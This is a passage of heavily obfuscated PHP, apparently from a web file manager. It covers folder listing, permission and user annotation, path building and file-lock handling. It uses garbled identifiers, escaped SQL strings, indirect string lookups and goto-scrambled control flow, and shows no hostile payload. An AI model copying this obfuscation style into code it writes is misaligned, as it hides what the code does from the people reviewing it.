"\123\105\114\105\103\124\40\52\x20\106\122\117\x4d\40\50\123\x45\x4c\105\x43\124\40\x27{$dÀ¡Šëñ²î}\137\x68\141\163\106\x69\154\145\47\x20\x61\163\40\150\x61\163\54\143\157\165\156\164\50\61\x29\x20\x61\163\40\150\141\x73\103\157\165\156\164\40\x46\x52\x4f\x4d\x20\x60{$F¹‡øáóì}\140\40\xa\11\x9\11\x9\x9\167\150\145\162\x65\40\x70\x61\x72\x65\156\x74\111\104\75{$dÀ¡Šëñ²î}\x20\x61\156\144\x20\151\163\106\157\x6c\x64\145\162\75\x30\x20\141\156\144\x20\x69\x73\104\145\x6c\145\x74\145\x3d{$B’µÇƒ•©£}\x29\40\141\x73\x20\x74\142\x31\137{$dÀ¡Šëñ²î}\40\165\156\151\x6f\156\40\x61\154\154\x20\12\x9\11\11\11\x9\x53\x45\x4c\x45\x43\x54\40\x2a\40\106\x52\x4f\x4d\40\50\x53\x45\x4c\105\103\124\40\47{$dÀ¡Šëñ²î}\x5f\150\x61\x73\x46\157\x6c\x64\x65\162\47\x20\x61\163\40\x68\x61\x73\x46\x69\154\x65\x2c\x63\157\x75\x6e\x74\50\x31\51\40\141\163\40\150\x61\x73\x43\157\165\156\x74\x20\106\x52\117\x4d\40\140{$F¹‡øáóì}\x60\40\12\11\x9\x9\11\11\167\x68\x65\x72\x65\40\160\141\x72\145\x6e\x74\x49\x44\75{$dÀ¡Šëñ²î}\40\141\x6e\x64\x20\x69\163\106\157\x6c\144\145\x72\75\61\x20\x61\156\144\x20\x69\163\104\x65\154\x65\164\145\75{$B’µÇƒ•©£}\51\x20\x61\163\x20\164\x62\62\x5f{$dÀ¡Šëñ²î}\40\165\156\x69\x6f\156\40\141\x6c\154\x20"; } if ((strlen($C§ƒ³¾§) >= $b®ÈóëØ”† || $a°·œÔàÀ == $EÈ”¥•¿àß - 1) && $C§ƒ³¾§) { $C§ƒ³¾§ = substr($C§ƒ³¾§, 0, -strlen($DÂÔ™Ó“œÓ[453])); $aà˜®˜ä = $this->query($C§ƒ³¾§); $Dƒï²ŒÕ = array_merge($Dƒï²ŒÕ, $aà˜®˜ä); $C§ƒ³¾§ = $DÂÔ™Ó“œÓ[33]; } } $Dƒï²ŒÕ = array_to_keyvalue($Dƒï²ŒÕ, $DÂÔ™Ó“œÓ[454]); goto E‹İ‡Ğ÷ÈÎ; E¨Ù–›‡ğ: $b®ÈóëØ”† = 1024 * 50; $dĞñàƒªÅƒ = is_array($dĞñàƒªÅƒ) ? $dĞñàƒªÅƒ : array(); $EÈ”¥•¿àß = count($dĞñàƒªÅƒ); goto Aœ„¿œÛÙï; fˆ±æÌ«æ‡: $DÂÔ™Ó“œÓ =& $_SERVER[Ä¿Ş°¨]; $C§ƒ³¾§ = $DÂÔ™Ó“œÓ[357]; $Dƒï²ŒÕ = array(); goto E¨Ù–›‡ğ; C¬ÚÛ¯ìß¢: } protected function _listAppendAuth(&$Aèõ»í·¦Ğ) { goto a®’–ô®Ñˆ; EªÈÆĞÅ£â: foreach ($Aèõ»í·¦Ğ as $DĞ¥×„æÍÊ) { if ($DĞ¥×„æÍÊ[$EÍ—Øé«İ[376]] == self::TYPE_GROUP) { $EôéÅà³«[] = $DĞ¥×„æÍÊ[$EÍ—Øé«İ[374]]; } } if (!$EôéÅà³«) { return; } $A……¬Ì£È = array_to_keyvalue($Aèõ»í·¦Ğ, $EÍ—Øé«İ[374]); goto C´ÇğÏÑ°¹; C´ÇğÏÑ°¹: $c»âèÃ„ÌÓ = Model($EÍ—Øé«İ[458])->getSourceList($EôéÅà³«, $A……¬Ì£È); foreach ($Aèõ»í·¦Ğ as $B§‹„œ‰Ô« => &$DĞ¥×„æÍÊ) { $DĞ¥×„æÍÊ[$EÍ—Øé«İ[381]] = $c»âèÃ„ÌÓ[$DĞ¥×„æÍÊ[$EÍ—Øé«İ[374]]]; if (!$DĞ¥×„æÍÊ[$EÍ—Øé«İ[381]] && $DĞ¥×„æÍÊ[$EÍ—Øé«İ[376]] == self::TYPE_GROUP) { $DĞ¥×„æÍÊ[$EÍ—Øé«İ[381]] = Action($EÍ—Øé«İ[459])->pathGroupAuthMake($DĞ¥×„æÍÊ[$EÍ—Øé«İ[460]]); if (!$DĞ¥×„æÍÊ[$EÍ—Øé«İ[381]] && !_get($GLOBALS, $EÍ—Øé«İ[461])) { $DĞ¥×„æÍÊ[$EÍ—Øé«İ[185]] = !1; $DĞ¥×„æÍÊ[$EÍ—Øé«İ[184]] = !1; } } if ($DĞ¥×„æÍÊ[$EÍ—Øé«İ[381]]) { $DĞ¥×„æÍÊ[$EÍ—Øé«İ[185]] = AuthModel::authCheckEdit($DĞ¥×„æÍÊ[$EÍ—Øé«İ[381]][$EÍ—Øé«İ[382]]); $DĞ¥×„æÍÊ[$EÍ—Øé«İ[184]] = AuthModel::authCheckView($DĞ¥×„æÍÊ[$EÍ—Øé«İ[381]][$EÍ—Øé«İ[382]]); } $this->groupPathDisplay($DĞ¥×„æÍÊ); } goto bÕ¾­ºÑ§‹; a®’–ô®Ñˆ: $EÍ—Øé«İ =& $_SERVER[Ä¿Ş°¨]; if (!defined($EÍ—Øé«İ[431])) { return; } $EôéÅà³« = array(); goto EªÈÆĞÅ£â; bÕ¾­ºÑ§‹: } public function groupPathDisplay(&$BïÏ‚«Œ•ù) { goto E½ïîÅ¶; cè©Ç©ò¹å: $b¶šĞæÖ»‚ = $this->parentLevelArray($B‚®ó™‹ïÒ[$E½½‡— ØÄ[463]]); $eÉ„ùƒİ”‰ = $E½½‡— ØÄ[33]; foreach ($b¶šĞæÖ»‚ as $B±´ä÷ŞÙ) { $cíã¶Ûøå» = Model($E½½‡— ØÄ[462])->getInfo($B±´ä÷ŞÙ); $eÉ„ùƒİ”‰ .= $cíã¶Ûøå»[$E½½‡— ØÄ[396]][$E½½‡— ØÄ[374]] . $E½½‡— ØÄ[47]; } goto EÅÁŒğ¬ÇŠ; DÅ¨Âï·ª: $BïÏ‚«Œ•ù[$E½½‡— ØÄ[468]] = $eÉ„ùƒİ”‰ . $B‚®ó™‹ïÒ[$E½½‡— ØÄ[396]][$E½½‡— ØÄ[374]]; goto cäíŸİ°Áº; EÅÁŒğ¬ÇŠ: $BïÏ‚«Œ•ù[$E½½‡— ØÄ[464]] = $B‚®ó™‹ïÒ[$E½½‡— ØÄ[465]]; $BïÏ‚«Œ•ù[$E½½‡— ØÄ[385]] = $B‚®ó™‹ïÒ[$E½½‡— ØÄ[463]]; $BïÏ‚«Œ•ù[$E½½‡— ØÄ[466]] = $B‚®ó™‹ïÒ[$E½½‡— ØÄ[467]]; goto DÅ¨Âï·ª; E½ïîÅ¶: $E½½‡— ØÄ =& $_SERVER[Ä¿Ş°¨]; if ($BïÏ‚«Œ•ù[$E½½‡— ØÄ[376]] != self::TYPE_GROUP) { return; } $B‚®ó™‹ïÒ = Model($E½½‡— ØÄ[462])->getInfo($BïÏ‚«Œ•ù[$E½½‡— ØÄ[460]]); goto cè©Ç©ò¹å; cäíŸİ°Áº: } protected function _listAppendPath(&$dƒ¨Æ˜‘´) { goto B°éŠÖæ°ë; B°éŠÖæ°ë: $bÒƒ¾¢ø¬ =& $_SERVER[Ä¿Ş°¨]; $AĞÂÖ¿‚ = array(); foreach ($dƒ¨Æ˜‘´ as &$aùğí–ëÃ) { $AĞÂÖ¿‚[$aùğí–ëÃ[$bÒƒ¾¢ø¬[374]]] = $aùğí–ëÃ[$bÒƒ¾¢ø¬[28]]; $A‡‰²•—Õ§ = $this->parentLevelArray($aùğí–ëÃ[$bÒƒ¾¢ø¬[463]]); array_shift($A‡‰²•—Õ§); foreach ($A‡‰²•—Õ§ as $B«¤â›ÈˆÄ) { if (!isset($AĞÂÖ¿‚[$B«¤â›ÈˆÄ])) { $AĞÂÖ¿‚[$B«¤â›ÈˆÄ] = 0; } } } goto BìÏîá×´; BìÏîá×´: $E„¶ìÊ†ìå = array(); foreach ($AĞÂÖ¿‚ as $F»˜Æ‰Â÷Ä => $FÛµ÷‰š ©) { if (!$FÛµ÷‰š ©) { $E„¶ìÊ†ìå[] = $F»˜Æ‰Â÷Ä; } } if ($E„¶ìÊ†ìå) { $e—ÔÄ“µŒ = array($bÒƒ¾¢ø¬[388] => array($bÒƒ¾¢ø¬[389], $E„¶ìÊ†ìå)); if (count($E„¶ìÊ†ìå) == 1) { $c¨šãĞçîÍ = $this->sourceInfo($E„¶ìÊ†ìå[0]); $c¨šãĞçîÍ = is_array($c¨šãĞçîÍ) ? array($c¨šãĞçîÍ) : !1; } else { $c¨šãĞçîÍ = $this->field($bÒƒ¾¢ø¬[469])->where($e—ÔÄ“µŒ)->select(); } $c³Âäİ¬Û† = array_to_keyvalue($c¨šãĞçîÍ, $bÒƒ¾¢ø¬[374], $bÒƒ¾¢ø¬[28]); $AĞÂÖ¿‚ = array_merge_index($AĞÂÖ¿‚, $c³Âäİ¬Û†); } goto CğÓÙ»Åº; CğÓÙ»Åº: $eÚÎòİ‚…« = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($dƒ¨Æ˜‘´ as &$aùğí–ëÃ) { goto f¢İ¡§—; cŒÍàßÉô…: $F—¿ÑØ“‡ = trim($aùğí–ëÃ[$bÒƒ¾¢ø¬[470]], $bÒƒ¾¢ø¬[8]); if ($aùğí–ëÃ[$bÒƒ¾¢ø¬[465]] == $bÒƒ¾¢ø¬[472] && $F—¿ÑØ“‡) { $aùğí–ëÃ[$bÒƒ¾¢ø¬[28]] = $F—¿ÑØ“‡; } $this->_listAppendPathRecycle($aùğí–ëÃ, $A‡‰²•—Õ§, $eÚÎòİ‚…«); goto A¡¹ÑÚÓÆ; A˜ÁôÓÒ: if ($A‡‰²•—Õ§) { $F¨‚¦Çßßæ .= $aùğí–ëÃ[$bÒƒ¾¢ø¬[28]]; } if ($aùğí–ëÃ[$bÒƒ¾¢ø¬[375]]) { $F¨‚¦Çßßæ .= $bÒƒ¾¢ø¬[8]; } $aùğí–ëÃ[$bÒƒ¾¢ø¬[470]] = str_replace($bÒƒ¾¢ø¬[471], $bÒƒ¾¢ø¬[8], $F¨‚¦Çßßæ); goto cŒÍàßÉô…; f¢İ¡§—: $A‡‰²•—Õ§ = $this->parentLevelArray($aùğí–ëÃ[$bÒƒ¾¢ø¬[463]]); $F¨‚¦Çßßæ = $this->_listAppendPathRoot($aùğí–ëÃ, $A‡‰²•—Õ§); foreach ($A‡‰²•—Õ§ as $B«¤â›ÈˆÄ) { if (isset($AĞÂÖ¿‚[$B«¤â›ÈˆÄ])) { $F¨‚¦Çßßæ .= $AĞÂÖ¿‚[$B«¤â›ÈˆÄ] . $bÒƒ¾¢ø¬[8]; } } goto A˜ÁôÓÒ; A¡¹ÑÚÓÆ: } goto BªùÈ“ØèÆ; BªùÈ“ØèÆ: } private function _listAppendPathRecycle(&$f¢ºàô, $E‚ì±ÎÇä‡, $f»áèÉÆ‘) { goto A¦¹ˆ¹îŒ¨; Dº¨ã‚ïˆë: $f¢ºàô[$FïŠÅÕ×¿Ú[463]] = $FïŠÅÕ×¿Ú[474] . implode($FïŠÅÕ×¿Ú[47], array_slice($E‚ì±ÎÇä‡, 1)) . $FïŠÅÕ×¿Ú[47]; if ($f¢ºàô[$FïŠÅÕ×¿Ú[374]] == $f»áèÉÆ‘) { $f¢ºàô[$FïŠÅÕ×¿Ú[463]] = $FïŠÅÕ×¿Ú[474]; $f¢ºàô[$FïŠÅÕ×¿Ú[465]] = $FïŠÅÕ×¿Ú[472]; $f¢ºàô[$FïŠÅÕ×¿Ú[28]] = LNG($FïŠÅÕ×¿Ú[473]); } $f¢ºàô[$FïŠÅÕ×¿Ú[475]] = $FïŠÅÕ×¿Ú[476]; goto C¹¼ÉÁ”˜¦; F·ª´ÆÈ®“: $dè¸÷êåå = explode($FïŠÅÕ×¿Ú[8], trim($f¢ºàô[$FïŠÅÕ×¿Ú[470]], $FïŠÅÕ×¿Ú[8])); $FÜ…¸Óô² = implode($FïŠÅÕ×¿Ú[8], array_slice($dè¸÷êåå, 2)); $f¢ºàô[$FïŠÅÕ×¿Ú[470]] = $FïŠÅÕ×¿Ú[8] . LNG($FïŠÅÕ×¿Ú[473]) . $FïŠÅÕ×¿Ú[8] . ltrim($FÜ…¸Óô², $FïŠÅÕ×¿Ú[8]); goto Dº¨ã‚ïˆë; A¦¹ˆ¹îŒ¨: $FïŠÅÕ×¿Ú =& $_SERVER[Ä¿Ş°¨]; if (intval($f¢ºàô[$FïŠÅÕ×¿Ú[376]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($f»áèÉÆ‘, $E‚ì±ÎÇä‡) && $f¢ºàô[$FïŠÅÕ×¿Ú[374]] != $f»áèÉÆ‘) { return; } goto F·ª´ÆÈ®“; C¹¼ÉÁ”˜¦: } protected function _listAppendPathRoot(&$C·ô ¹Éç, $f¸‹£äÀ‘§) { $DÑë«¾™™ =& $_SERVER[Ä¿Ş°¨]; $aËˆõõùŸê = $DÑë«¾™™[33]; if ($C·ô ¹Éç[$DÑë«¾™™[376]] == self::TYPE_USER) { if (defined($DÑë«¾™™[431]) && $C·ô ¹Éç[$DÑë«¾™™[460]] == USER_ID) { $aËˆõõùŸê = LNG($DÑë«¾™™[477]); if (!$f¸‹£äÀ‘§) { $C·ô ¹Éç[$DÑë«¾™™[28]] = $aËˆõõùŸê; } } else { $f÷°¸Å†³‚ = Model($DÑë«¾™™[478])->getInfoSimple($C·ô ¹Éç[$DÑë«¾™™[460]]); $aËˆõõùŸê = LNG($DÑë«¾™™[479]) . $DÑë«¾™™[153] . $f÷°¸Å†³‚[$DÑë«¾™™[28]] . $DÑë«¾™™[480]; } } else { if ($C·ô ¹Éç[$DÑë«¾™™[376]] == self::TYPE_GROUP) { $f÷°¸Å†³‚ = Model($DÑë«¾™™[462])->getInfoSimple($C·ô ¹Éç[$DÑë«¾™™[460]]); $aËˆõõùŸê = $f÷°¸Å†³‚[$DÑë«¾™™[28]]; } else { if ($C·ô ¹Éç[$DÑë«¾™™[376]] == self::TYPE_SYSTEM) { $f÷°¸Å†³‚ = $this->sourceInfo($f¸‹£äÀ‘§[0], !0); $aËˆõõùŸê = $f÷°¸Å†³‚[$DÑë«¾™™[28]]; } } } $aËˆõõùŸê = $aËˆõõùŸê ? $DÑë«¾™™[8] . $aËˆõõùŸê . $DÑë«¾™™[8] : $DÑë«¾™™[8]; return $aËˆõõùŸê; } protected function _listAppendUser(&$F÷à±ô¡ä) { $bçíÉïë„ =& $_SERVER[Ä¿Ş°¨]; $A¥îÆ¾Üœ = array_to_keyvalue($F÷à±ô¡ä, $bçíÉïë„[33], $bçíÉïë„[383]); $e÷èÉ£©Åå = array_to_keyvalue($F÷à±ô¡ä, $bçíÉïë„[33], $bçíÉïë„[384]); $cÚÌÑÅ¶Å = array_merge($A¥îÆ¾Üœ, $e÷èÉ£©Åå); $F•š„ ãİ¢ = Model($bçíÉïë„[481])->userListInfo($cÚÌÑÅ¶Å); foreach ($F÷à±ô¡ä as &$BÅ£˜­§‹) { $eíÏİé”© = $BÅ£˜­§‹[$bçíÉïë„[383]]; $BÅ£˜­§‹[$bçíÉïë„[383]] = $F•š„ ãİ¢[$eíÏİé”©] ? $F•š„ ãİ¢[$eíÏİé”©] : !1; $eíÏİé”© = $BÅ£˜­§‹[$bçíÉïë„[384]]; $BÅ£˜­§‹[$bçíÉïë„[384]] = $F•š„ ãİ¢[$eíÏİé”©] ? $F•š„ ãİ¢[$eíÏİé”©] : !1; if (isset($BÅ£˜­§‹[$bçíÉïë„[421]]) && $BÅ£˜­§‹[$bçíÉïë„[421]][$bçíÉïë„[482]]) { $b®ìÔ’‡Ÿœ = $GLOBALS[$bçíÉïë„[6]][$bçíÉïë„[84]][$bçíÉïë„[483]]; if ($BÅ£˜­§‹[$bçíÉïë„[421]][$bçíÉïë„[484]] <= time() - $b®ìÔ’‡Ÿœ) { $this->metaSet($BÅ£˜­§‹[$bçíÉïë„[374]], $bçíÉïë„[482], null); $this->metaSet($BÅ£˜­§‹[$bçíÉïë„[374]], $bçíÉïë„[484], null); unset($BÅ£˜­§‹[$bçíÉïë„[421]][$bçíÉïë„[482]]); continue; } $F„»•ºß¨¾ = $BÅ£˜­§‹[$bçíÉïë„[421]][$bçíÉïë„[482]]; $BÅ£˜­§‹[$bçíÉïë„[421]][$bçíÉïë„[485]] = Model($bçíÉïë„[481])->getInfoSimpleOuter($F„»•ºß¨¾); } } } public function parentLevelArray($F¥«²¹ÃïÂ) { $EéÆÁóÉ¥¤ =& $_SERVER[Ä¿Ş°¨]; $F¥«²¹ÃïÂ = explode($EéÆÁóÉ¥¤[47], trim($F¥«²¹ÃïÂ, $EéÆÁóÉ¥¤[47])); return array_remove_value($F¥«²¹ÃïÂ, $EéÆÁóÉ¥¤[472]); } public function listAll($CÔÎ»¡°) { goto cì¼µÎÃÃƒ; d’ËìŠê: $FÅëÓ¾Ô„  = array_to_keyvalue($FÅëÓ¾Ô„ , $A‡ÆËêñï[374]); $EĞ¾»ÉÍè© = "\x2f{$D¬‚‘’„–õ[$A‡ÆËêñï[28]]}\57"; $EĞ¾»ÉÍè© = $EĞ¾»ÉÍè© == $A‡ÆËêñï[471] ? $A‡ÆËêñï[8] : $EĞ¾»ÉÍè©; goto Dî‘¬·…ÁÂ; D…ä­‘Çª¡: $f®Éæ‰¯îÈ = $A‡ÆËêñï[490]; $a§ºœÄòÂù = "\x4c\x45\106\124\x20\x4a\117\x49\116\40{$this->tablePrefix}\151\157\x5f\x66\x69\154\145\x20\146\x69\x6c\145\x20\157\x6e\x20\163\x6f\x75\x72\143\145\x2e\x66\151\154\145\111\x44\x20\x3d\40\x66\x69\154\145\56\x66\x69\154\145\111\x44"; $FÅëÓ¾Ô„  = $this->alias($A‡ÆËêñï[491])->field($f®Éæ‰¯îÈ)->where($C‡ìÖƒ„ğ¤)->join($a§ºœÄòÂù)->select(); goto eòµ­Úè³Ã; Dî‘¬·…ÁÂ: $bÃñŞÕÍô¡ = array(); foreach ($FÅëÓ¾Ô„  as $FâšèŒØ¢¦ => $BåÏÏß¶ŒÌ) { goto AÖ†î¶‘¿Æ; dëØÓÙ¿Çª: $D‚¥¥ŒíõŒ = str_replace($A‡ÆËêñï[471], $A‡ÆËêñï[8], $D‚¥¥ŒíõŒ); $D‚¥¥ŒíõŒ = str_replace($A‡ÆËêñï[471], $A‡ÆËêñï[8], $D‚¥¥ŒíõŒ); $b­µëŠã–é = array($A‡ÆËêñï[392] => str_replace($A‡ÆËêñï[471], $A‡ÆËêñï[8], $D‚¥¥ŒíõŒ), $A‡ÆËêñï[492] => intval($BåÏÏß¶ŒÌ[$A‡ÆËêñï[375]]), $A‡ÆËêñï[396] => $this->pathInfoFilter($BåÏÏß¶ŒÌ, !0)); goto e¾¹Ø£ª±; e¾¹Ø£ª±: if (!$BåÏÏß¶ŒÌ[$A‡ÆËêñï[375]]) { $b­µëŠã–é[$A‡ÆËêñï[423]] = $BåÏÏß¶ŒÌ[$A‡ÆËêñï[423]]; $b­µëŠã–é[$A‡ÆËêñï[493]] = $BåÏÏß¶ŒÌ[$A‡ÆËêñï[75]]; } $bÃñŞÕÍô¡[] = $b­µëŠã–é; goto Eíğ£ƒÖä; E•º§‹ššæ: for ($e£¤îùª¥Û = 0; $e£¤îùª¥Û < count($bÈ¾İÍ´Æ); $e£¤îùª¥Û++) { $D‚¥¥ŒíõŒ .= $FÅëÓ¾Ô„ [$bÈ¾İÍ´Æ[$e£¤îùª¥Û]][$A‡ÆËêñï[28]] . $A‡ÆËêñï[8]; } $D‚¥¥ŒíõŒ .= $BåÏÏß¶ŒÌ[$A‡ÆËêñï[28]]; if ($BåÏÏß¶ŒÌ[$A‡ÆËêñï[375]]) { $D‚¥¥ŒíõŒ .= $A‡ÆËêñï[8]; } goto dëØÓÙ¿Çª; AÖ†î¶‘¿Æ: $bÈ¾İÍ´Æ = $this->parentLevelArray($BåÏÏß¶ŒÌ[$A‡ÆËêñï[463]]); array_shift($bÈ¾İÍ´Æ); $D‚¥¥ŒíõŒ = $EĞ¾»ÉÍè©; goto E•º§‹ššæ; Eíğ£ƒÖä: } return $bÃñŞÕÍô¡; goto f‡‚™ØªÇÙ; cì¼µÎÃÃƒ: $A‡ÆËêñï =& $_SERVER[Ä¿Ş°¨]; $D¬‚‘’„–õ = $this->sourceInfo($CÔÎ»¡°); $C‡ìÖƒ„ğ¤ = array($A‡ÆËêñï[486] => array($A‡ÆËêñï[487], $D¬‚‘’„–õ[$A‡ÆËêñï[463]] . $CÔÎ»¡° . $A‡ÆËêñï[488]), $A‡ÆËêñï[489] => 0); goto D…ä­‘Çª¡; eòµ­Úè³Ã: $this->_listAppendAuth($FÅëÓ¾Ô„ ); $this->_listAppendUser($FÅëÓ¾Ô„ ); $this->_listAppendPath($FÅëÓ¾Ô„ ); goto d’ËìŠê; f‡‚™ØªÇÙ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Bè ¾ßÎ…Õ) { goto B“‹®§˜½î; aã™¿Ñˆ°: $this->_lockEvent($Bè ¾ßÎ…Õ, array($d×ôà†óÉ[497], $d×ôà†óÉ[498]), $FÑº÷·¼ØØ); $this->_lockCheckEnd($d×ôà†óÉ[494], $Bè ¾ßÎ…Õ); goto f°™µØî‘Ô; cê¯„œ³‡ : $FÑº÷·¼ØØ = 1; $this->_lockEvent($Bè ¾ßÎ…Õ, array($d×ôà†óÉ[495], $d×ôà†óÉ[496]), $FÑº÷·¼ØØ); $this->_lockParent($Bè ¾ßÎ…Õ, array($d×ôà†óÉ[496]), $FÑº÷·¼ØØ); goto aã™¿Ñˆ°; B“‹®§˜½î: $d×ôà†óÉ =& $_SERVER[Ä¿Ş°¨]; if (!$this->allowLock()) { return; } $this->_lockCheck($d×ôà†óÉ[494], $Bè ¾ßÎ…Õ); goto cê¯„œ³‡ ; f°™µØî‘Ô: } public function lockCopyEnd($FÕƒ«™ŒÍŞ) { $Fù’ô»“ä‘ =& $_SERVER[Ä¿Ş°¨]; if (!$this->allowLock()) { return; } $bˆë’Î–áË = 0; $this->_lockEvent($FÕƒ«™ŒÍŞ, array($Fù’ô»“ä‘[495], $Fù’ô»“ä‘[496]), $bˆë’Î–áË); $this->_lockParent($FÕƒ«™ŒÍŞ, array($Fù’ô»“ä‘[496]), $bˆë’Î–áË); $this->_lockEvent($FÕƒ«™ŒÍŞ, array($Fù’ô»“ä‘[497], $Fù’ô»“ä‘[498]), $bˆë’Î–áË); } public function lockWriteStart($cµ×“³‡°‚, $F‘Ù§–ÎåÛ = '') { goto CØœ›‹ºà; CØœ›‹ºà: $DÈ¶·ƒÍê =& $_SERVER[Ä¿Ş°¨]; if (!$this->allowLock()) { return; } $this->_lockCheck($DÈ¶·ƒÍê[495], $cµ×“³‡°‚); goto a†é“œÔáª; a†é“œÔáª: $C‘å›œËå = 1; $this->_lockKey($DÈ¶·ƒÍê[499] . $cµ×“³‡°‚ . $DÈ¶·ƒÍê[91] . $F‘Ù§–ÎåÛ, $C‘å›œËå); $this->_lockEvent($cµ×“³‡°‚, array($DÈ¶·ƒÍê[494], $DÈ¶·ƒÍê[496]), $C‘å›œËå); goto Då¸Šµì; Då¸Šµì: $this->_lockParent($cµ×“³‡°‚, array($DÈ¶·ƒÍê[494], $DÈ¶·ƒÍê[496]), $C‘å›œËå); $this->_lockCheckEnd($DÈ¶·ƒÍê[495], $cµ×“³‡°‚); goto bĞÆ Ë¯ÚŠ; bĞÆ Ë¯ÚŠ: } public function lockWriteEnd($b˜ÚÅ«Ø˜, $AÍºœ»®°­ = '') { $ağÍ¨ÚšÕè =& $_SERVER[Ä¿Ş°¨]; if (!$this->allowLock()) { return; } $a·Ô‡ºÜ¬ = 0; $this->_lockKey($ağÍ¨ÚšÕè[499] . $b˜ÚÅ«Ø˜ . $ağÍ¨ÚšÕè[91] . $AÍºœ»®°­, $a·Ô‡ºÜ¬); $this->_lockEvent($b˜ÚÅ«Ø˜, array($ağÍ¨ÚšÕè[494], $ağÍ¨ÚšÕè[496]), $a·Ô‡ºÜ¬); $this->_lockParent($b˜ÚÅ«Ø˜, array($ağÍ¨ÚšÕè[494], $ağÍ¨ÚšÕè[496]), $a·Ô‡ºÜ¬); } public function lockMoveStart($D˜Š¯îß¢) { goto AİÖª–Å‰; Aè™‘˜àˆà: $this->_lockParent($D˜Š¯îß¢, array($FÊ»„ğçõø[494], $FÊ»„ğçõø[496]), $A…¯ËÍ“Æ); $this->_lockEvent($D˜Š¯îß¢, array($FÊ»„ğçõø[501], $FÊ»„ğçõø[497], $FÊ»„ğçõø[498]), $A…¯ËÍ“Æ); $this->_lockCheckEnd($FÊ»„ğçõø[496], $D˜Š¯îß¢); goto C®İ¬Ùêâõ; AİÖª–Å‰: $FÊ»„ğçõø =& $_SERVER[Ä¿Ş°¨]; if (!$this->allowLock()) { return; } $this->_lockCheck($FÊ»„ğçõø[496], $D˜Š¯îß¢); goto e’’ƒ³÷¢Ñ; e’’ƒ³÷¢Ñ: $A…¯ËÍ“Æ = 1; $this->_lockKey($FÊ»„ğçõø[500] . $D˜Š¯îß¢, $A…¯ËÍ“Æ); $this->_lockEvent($D˜Š¯îß¢, array($FÊ»„ğçõø[494], $FÊ»„ğçõø[495]), $A…¯ËÍ“Æ); goto Aè™‘˜àˆà; C®İ¬Ùêâõ: } public function lockMoveEnd($cÃ¡Œ‡íëÈ) { goto A‰Æ„ö¸³; c¨ÖŞ¸«‡ƒ: $this->_lockKey($A‚Ì¨‰Í—[500] . $cÃ¡Œ‡íëÈ, $e²•ñåÆßÈ); $this->_lockEvent($cÃ¡Œ‡íëÈ, array($A‚Ì¨‰Í—[494], $A‚Ì¨‰Í—[495]), $e²•ñåÆßÈ); $this->_lockParent($cÃ¡Œ‡íëÈ, array($A‚Ì¨‰Í—[494], $A‚Ì¨‰Í—[496]), $e²•ñåÆßÈ); goto f½ëÙàµíÌ; f½ëÙàµíÌ: $this->_lockEvent($cÃ¡Œ‡íëÈ, array($A‚Ì¨‰Í—[501], $A‚Ì¨‰Í—[497], $A‚Ì¨‰Í—[498]), $e²•ñåÆßÈ); goto aùÉÄšÊÃ; A‰Æ„ö¸³: $A‚Ì¨‰Í— =& $_SERVER[Ä¿Ş°¨]; if (!$this->allowLock()) { return; } $e²•ñåÆßÈ = 0; goto c¨ÖŞ¸«‡ƒ; aùÉÄšÊÃ: } private function _lockCheck($c¾ÌÑğ¼ì, $AÏàÊÉŒ¬) { goto Dáå¢µº¶—; D“Öí¥šˆ: $this->_lockTimeStart[$e˜…¾ğ‚¡á] = timeFloat(); if (!is_array($A§Æª„ÓíÊ)) { return; } $B®Ä¯†Ñ… = LNG($EŠá‰¾Š³[502]); goto BÒÅÜó´î; BÒÅÜó´î: CacheLock::setErrorMsg($EŠá‰¾Š³[153] . htmlspecialchars($A§Æª„ÓíÊ[$EŠá‰¾Š³[28]]) . $EŠá‰¾Š³[480] . $B®Ä¯†Ñ…); $this->_lockKey($e˜…¾ğ‚¡á, 1); $this->_lockKey($e˜…¾ğ‚¡á, 0); goto bçÄ¤½Àßæ; Dáå¢µº¶—: $EŠá‰¾Š³ =& $_SERVER[Ä¿Ş°¨]; $A§Æª„ÓíÊ = $this->sourceInfo($AÏàÊÉŒ¬); $e˜…¾ğ‚¡á = $c¾ÌÑğ¼ì . $EŠá‰¾Š³[91] . $AÏàÊÉŒ¬; goto D“Öí¥šˆ; bçÄ¤½Àßæ: $FÙ¡Åç°¨„ = array_reverse($this->parentLevelArray($A§Æª„ÓíÊ[$EŠá‰¾Š³[463]])); foreach ($FÙ¡Åç°¨„ as $Dæ±êÍ™¾) { $e˜…¾ğ‚¡á = $c¾ÌÑğ¼ì . $EŠá‰¾Š³[503] . $Dæ±êÍ™¾; if (CacheLock::lockGet($EŠá‰¾Š³[504] . $e˜…¾ğ‚¡á)) { $A§Æª„ÓíÊ = $this->sourceInfo($Dæ±êÍ™¾); CacheLock::setErrorMsg($EŠá‰¾Š³[153] . htmlspecialchars($A§Æª„ÓíÊ[$EŠá‰¾Š³[28]]) . $EŠá‰¾Š³[480] . $B®Ä¯†Ñ…); $this->_lockKey($e˜…¾ğ‚¡á, 1); $this->_lockKey($e˜…¾ğ‚¡á, 0); } } goto cÁì¥î±¿°; cÁì¥î±¿°: } private function _lockCheckEnd($B¼ĞÂå½ÜŞ, $cõ¬ËŒ½Õö) { goto dì•§ºÄ‚; dì•§ºÄ‚: $Dª¼³ÎùÀ =& $_SERVER[Ä¿Ş°¨]; $CÓÄÚªë½“ = $B¼ĞÂå½ÜŞ . $Dª¼³ÎùÀ[91] . $cõ¬ËŒ½Õö; CacheLock::setErrorMsg($Dª¼³ÎùÀ[357]); goto fËÒÖ¢½³·; e–õ’÷ìÎ©: if ($D²‘ø” > 0.5) { unset(self::$cacheSourceInfo[$Dª¼³ÎùÀ[414] . $cõ¬ËŒ½Õö]); } $Aí’âİœéô = $this->sourceInfo($cõ¬ËŒ½Õö); if (!$Aí’âİœéô) { show_json(LNG($Dª¼³ÎùÀ[100]), !1); } goto c‹ô­‰µ°“; fËÒÖ¢½³·: if (!isset($this->_lockTimeStart[$CÓÄÚªë½“])) { return; } $D²‘ø” = timeFloat() - $this->_lockTimeStart[$CÓÄÚªë½“]; unset($this->_lockTimeStart[$CÓÄÚªë½“]); goto e–õ’÷ìÎ©; c‹ô­‰µ°“: } private function _lockParent($eõ×˜­¦Œ¹, $aÁÊ¤œ‚¼, $CÀÆ´ØÆ³‡) { if (!$this->autoLockSet) { return; } $dğå¯Ïº¬‹ = $this->sourceInfo($eõ×˜­¦Œ¹); if (!is_array($dğå¯Ïº¬‹)) { return; } 